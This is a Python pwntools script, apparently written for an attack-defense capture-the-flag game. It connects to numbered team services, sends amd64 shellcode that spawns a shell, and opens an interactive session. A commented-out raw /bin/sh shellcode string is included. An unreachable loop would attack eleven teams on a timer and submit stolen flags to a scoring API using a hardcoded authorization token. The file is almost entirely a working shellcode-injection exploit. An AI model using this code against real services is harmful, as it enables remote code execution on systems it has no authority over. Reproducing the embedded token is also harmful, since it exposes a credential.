import requests
import multiprocessing
from time import sleep
from pwn import *
import pwnlib

context.log_level = "error"


def exploit(team: str = 10):
    # shellcraft.
    # shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
    try:
        port = 10000
        ip = "172.31.2.2"
        r = remote(ip, port + team)
        r.recvline()
        r.recvline()
        r.recvline()
        r.sendline("Cakra")
        r.recvuntil("?\n")
        r.send(pwnlib.shellcraft.amd64.sh())
        r.interactive()
        # return flag.decode('utf8')
    except (EOFError):
        return ""


def submit(flag: str):
    headers = {
        "Authorization": "mtUJh44ViZCilVOh_QMvdoSpcoSxURLU_wcrQuq_-sFFFHR_aw7mMQ"}
    with requests.Session() as s:
        r = s.post("http://172.31.1.1/api/flag/submit", json={
            "flag": flag
        }, headers=headers)
        # print(r)
        return str(r.text)


def main():
    exploit()
    exit(0)
    ticks = 10 * 60
    while True:
        with multiprocessing.Pool() as p:
            flags = p.map(exploit, range(1, 12))

        flags = list(set(flags))
        flags.remove("")
        # print(type(flags[0]))
        print(flags)

        with multiprocessing.Pool() as p:
            response = p.map(submit, flags)

        print(response)
        sleep(ticks)


if __name__ == "__main__":
    main()
